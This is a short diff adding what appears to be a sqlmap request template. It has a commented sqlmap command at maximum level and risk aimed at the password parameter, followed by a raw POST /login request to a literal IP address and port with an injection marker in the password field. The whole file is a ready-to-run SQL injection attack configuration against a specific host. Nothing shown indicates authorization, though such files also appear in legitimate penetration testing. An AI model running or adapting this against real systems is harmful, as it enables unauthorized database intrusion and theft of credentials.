@@ -1,0 +1,9 @@
+# python3 ../../../../sqlmap/sqlmap.py -v -r "login.template" --batch --level=5 --risk=3 --flush-session --fresh-queries --threads=8 --output-dir=./sqlmap-login -p password
+
+POST /login HTTP/1.1
+Host: 163.172.68.42:5000
+Content-Type: application/x-www-form-urlencoded
+User-Agent: sqlmap/1.8.4.7#dev (http://sqlmap.org)
+Cache-Control: no-cache
+
+username=test@test.com&password=2*
